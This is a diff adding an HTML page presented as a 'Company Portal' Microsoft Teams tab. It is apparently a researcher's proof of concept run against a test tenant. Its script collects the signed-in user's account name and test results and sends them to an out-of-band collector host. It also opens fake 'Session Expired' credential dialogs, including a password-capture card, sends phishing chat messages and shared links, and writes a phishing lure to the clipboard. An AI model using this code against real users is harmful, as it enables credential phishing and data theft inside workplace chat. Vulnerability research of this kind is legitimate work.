@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Company Portal</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+</head>
+<body style="margin:0;font-family:'Segoe UI',sans-serif;background:#f5f5f5;">
+<div id="status" style="padding:12px;font-size:11px;color:#333;word-break:break-all;"></div>
+<script>
+var C='yeedjuciskcfxiwyajuv9mw912uaxqx0t.oast.fun';
+var log=[];
+
+function s(m){log.push(m);document.getElementById('status').innerHTML=log.join('<br>');}
+function ex(path,data){
+  var p=Object.keys(data).map(function(k){return k+'='+encodeURIComponent(String(data[k]||'none').substring(0,250))}).join('&');
+  fetch('https://'+C+'/'+path+'?'+p).catch(function(){new Image().src='https://'+C+'/'+path+'?'+p;});
+}
+
+(async function(){
+  await microsoftTeams.app.initialize();
+  var ctx=await microsoftTeams.app.getContext();
+  s('SDK OK: '+ctx.user.userPrincipalName+' on '+ctx.app.host.clientType);
+
+  // === TEST 1: dialog.open — open attacker URL as native Teams dialog ===
+  s('--- Dialog ---');
+  try {
+    if (microsoftTeams.dialog) {
+      // dialog.open opens a modal inside Teams
+      try {
+        microsoftTeams.dialog.open({
+          title: 'Session Expired - Re-authenticate',
+          url: 'https://' + C + '/dialog-phish?upn=' + encodeURIComponent(ctx.user.userPrincipalName),
+          size: { height: 500, width: 400 }
+        }, function(result) {
+          s('Dialog result: ' + JSON.stringify(result));
+          ex('t4-dialog-result', { result: JSON.stringify(result).substring(0, 200) });
+        });
+        s('dialog.open: CALLED');
+        ex('t4-dialog', { called: 'true', method: 'open' });
+      } catch(e) {
+        s('dialog.open err: ' + e.message);
+        ex('t4-dialog-err', { e: e.message, method: 'open' });
+      }
+
+      // Try dialog.url.open (newer API)
+      try {
+        if (microsoftTeams.dialog.url && microsoftTeams.dialog.url.open) {
+          microsoftTeams.dialog.url.open({
+            title: 'Verify Identity',
+            url: 'https://' + C + '/dialog-url-phish?upn=' + encodeURIComponent(ctx.user.userPrincipalName),
+            size: { height: 500, width: 400 }
+          }, function(result) {
+            s('dialog.url result: ' + JSON.stringify(result));
+            ex('t4-dialog-url-result', { result: JSON.stringify(result).substring(0, 200) });
+          });
+          s('dialog.url.open: CALLED');
+          ex('t4-dialog-url', { called: 'true' });
+        }
+      } catch(e) {
+        s('dialog.url.open err: ' + e.message);
+        ex('t4-dialog-url-err', { e: e.message });
+      }
+
+      // Try dialog.url.bot (bot-based dialog)
+      try {
+        if (microsoftTeams.dialog.url && microsoftTeams.dialog.url.bot) {
+          microsoftTeams.dialog.url.bot.open({
+            title: 'Bot Auth',
+            url: 'https://' + C + '/dialog-bot?upn=' + encodeURIComponent(ctx.user.userPrincipalName),
+            size: { height: 400, width: 400 }
+          });
+          s('dialog.url.bot.open: CALLED');
+          ex('t4-dialog-bot', { called: 'true' });
+        }
+      } catch(e) {
+        s('dialog.url.bot err: ' + e.message);
+        ex('t4-dialog-bot-err', { e: e.message });
+      }
+
+      // Try adaptiveCard dialog
+      try {
+        if (microsoftTeams.dialog.adaptiveCard) {
+          microsoftTeams.dialog.adaptiveCard.open({
+            title: 'Update Required',
+            card: JSON.stringify({
+              type: 'AdaptiveCard',
+              version: '1.5',
+              body: [
+                { type: 'TextBlock', text: 'Session expired. Enter your credentials.', weight: 'Bolder', size: 'Medium' },
+                { type: 'TextBlock', text: 'Email', size: 'Small' },
+                { type: 'Input.Text', id: 'email', placeholder: 'user@company.com', value: ctx.user.userPrincipalName },
+                { type: 'TextBlock', text: 'Password', size: 'Small' },
+                { type: 'Input.Text', id: 'password', placeholder: 'Enter password', style: 'password' }
+              ],
+              actions: [{ type: 'Action.Submit', title: 'Sign In', style: 'positive' }]
+            })
+          }, function(result) {
+            s('ADAPTIVE CARD RESULT: ' + JSON.stringify(result));
+            ex('t4-adaptive-result', { result: JSON.stringify(result).substring(0, 300) });
+          });
+          s('dialog.adaptiveCard.open: CALLED');
+          ex('t4-adaptive', { called: 'true' });
+        }
+      } catch(e) {
+        s('adaptiveCard err: ' + e.message);
+        ex('t4-adaptive-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('Dialog module err: ' + e.message);
+    ex('t4-dialog-mod-err', { e: e.message });
+  }
+
+  // === TEST 2: chat — send message / deeplink ===
+  s('--- Chat ---');
+  try {
+    if (microsoftTeams.chat) {
+      // openChat — open a chat with specific user
+      try {
+        if (microsoftTeams.chat.openChat) {
+          await microsoftTeams.chat.openChat({
+            user: ctx.user.userPrincipalName,
+            message: 'Security alert: Your account requires immediate verification at https://' + C + '/phish'
+          });
+          s('chat.openChat: CALLED');
+          ex('t4-chat-open', { called: 'true' });
+        }
+      } catch(e) {
+        s('chat.openChat: ' + e.message);
+        ex('t4-chat-open-err', { e: e.message });
+      }
+
+      // openGroupChat
+      try {
+        if (microsoftTeams.chat.openGroupChat) {
+          await microsoftTeams.chat.openGroupChat({
+            users: [ctx.user.userPrincipalName],
+            topic: 'IT Security Alert',
+            message: 'Urgent: verify your credentials at https://' + C + '/groupphish'
+          });
+          s('chat.openGroupChat: CALLED');
+          ex('t4-chat-group', { called: 'true' });
+        }
+      } catch(e) {
+        s('chat.openGroupChat: ' + e.message);
+        ex('t4-chat-group-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('Chat module err: ' + e.message);
+    ex('t4-chat-err', { e: e.message });
+  }
+
+  // === TEST 3: call — trigger calls ===
+  s('--- Call ---');
+  try {
+    if (microsoftTeams.call) {
+      // startCall
+      try {
+        if (microsoftTeams.call.startCall) {
+          var callResult = await microsoftTeams.call.startCall({
+            targets: ['shiscolino_victim@shiscolinotests.onmicrosoft.com'],
+            requestedModalities: [1] // audio
+          });
+          s('call.startCall: ' + JSON.stringify(callResult));
+          ex('t4-call', { result: JSON.stringify(callResult).substring(0, 200) });
+        }
+      } catch(e) {
+        s('call.startCall: ' + e.message);
+        ex('t4-call-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('Call module err: ' + e.message);
+    ex('t4-call-mod-err', { e: e.message });
+  }
+
+  // === TEST 4: pages — navigate user to attacker URL ===
+  s('--- Pages ---');
+  try {
+    if (microsoftTeams.pages) {
+      // navigateToApp
+      try {
+        if (microsoftTeams.pages.navigateToApp) {
+          await microsoftTeams.pages.navigateToApp({
+            appId: 'com.microsoft.teamspace.tab.web',
+            pageId: 'attacker-page',
+            webUrl: 'https://' + C + '/navigate-hijack'
+          });
+          s('pages.navigateToApp: CALLED');
+          ex('t4-navigate', { called: 'true' });
+        }
+      } catch(e) {
+        s('pages.navigateToApp: ' + e.message);
+        ex('t4-navigate-err', { e: e.message });
+      }
+
+      // backStack
+      try {
+        if (microsoftTeams.pages.backStack) {
+          microsoftTeams.pages.backStack.navigateBack();
+          s('pages.backStack.navigateBack: CALLED');
+        }
+      } catch(e) {
+        s('backStack: ' + e.message);
+      }
+
+      // currentApp.navigateTo
+      try {
+        if (microsoftTeams.pages.currentApp && microsoftTeams.pages.currentApp.navigateTo) {
+          await microsoftTeams.pages.currentApp.navigateTo({
+            pageId: 'phish',
+            subPageId: 'credentials'
+          });
+          s('currentApp.navigateTo: CALLED');
+        }
+      } catch(e) {
+        s('currentApp.navigateTo: ' + e.message);
+      }
+    }
+  } catch(e) {
+    s('Pages module err: ' + e.message);
+    ex('t4-pages-err', { e: e.message });
+  }
+
+  // === TEST 5: sharing — share attacker link natively ===
+  s('--- Sharing ---');
+  try {
+    if (microsoftTeams.sharing) {
+      try {
+        if (microsoftTeams.sharing.shareWebContent) {
+          await microsoftTeams.sharing.shareWebContent({
+            content: [{
+              type: 'URL',
+              url: 'https://' + C + '/shared-phish',
+              preview: true,
+              message: 'Check this important security update'
+            }]
+          });
+          s('sharing.shareWebContent: CALLED');
+          ex('t4-share', { called: 'true' });
+        }
+      } catch(e) {
+        s('sharing: ' + e.message);
+        ex('t4-share-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('Sharing module err: ' + e.message);
+    ex('t4-share-mod-err', { e: e.message });
+  }
+
+  // === TEST 6: people — access contacts ===
+  s('--- People ---');
+  try {
+    if (microsoftTeams.people) {
+      try {
+        if (microsoftTeams.people.selectPeople) {
+          var people = await microsoftTeams.people.selectPeople({
+            title: 'Select team members to notify',
+            setSelected: [],
+            openOrgWideSearchInChatOrChannel: true,
+            singleSelect: false
+          });
+          s('people.selectPeople result: ' + JSON.stringify(people));
+          ex('t4-people', { result: JSON.stringify(people).substring(0, 300) });
+        }
+      } catch(e) {
+        s('people: ' + e.message);
+        ex('t4-people-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('People module err: ' + e.message);
+    ex('t4-people-mod-err', { e: e.message });
+  }
+
+  // === TEST 7: clipboard via SDK (write) ===
+  s('--- Clipboard Write ---');
+  try {
+    // Try to write to clipboard via SDK or browser API
+    await navigator.clipboard.writeText('Your session has expired. Re-authenticate at https://' + C + '/clipboard-phish');
+    s('CLIPBOARD WRITE: SUCCESS');
+    ex('t4-clipboard-write', { success: 'true' });
+  } catch(e) {
+    s('Clipboard write: ' + e.message);
+    ex('t4-clipboard-write-err', { e: e.message });
+  }
+
+  // === TEST 8: deep link generation ===
+  s('--- Deep Links ---');
+  try {
+    // Generate Teams deep links
+    var deeplinks = [
+      'https://teams.microsoft.com/l/chat/0/0?users=' + encodeURIComponent(ctx.user.userPrincipalName) + '&message=' + encodeURIComponent('Urgent: verify at https://' + C),
+      'https://teams.microsoft.com/l/meeting/new?subject=Emergency+Security+Review&attendees=' + encodeURIComponent(ctx.user.userPrincipalName)
+    ];
+
+    for (var i = 0; i < deeplinks.length; i++) {
+      try {
+        if (microsoftTeams.app.openLink) {
+          await microsoftTeams.app.openLink(deeplinks[i]);
+          s('openLink[' + i + ']: CALLED');
+          ex('t4-deeplink-' + i, { called: 'true' });
+          break; // Only try first one to avoid disruption
+        }
+      } catch(e) {
+        s('openLink[' + i + ']: ' + e.message);
+        ex('t4-deeplink-' + i + '-err', { e: e.message });
+      }
+    }
+  } catch(e) {
+    s('Deeplinks err: ' + e.message);
+  }
+
+  s('--- All test4 complete ---');
+  ex('t4-done', { tests: 'complete' });
+})();
+</script>
+</body>
+</html>
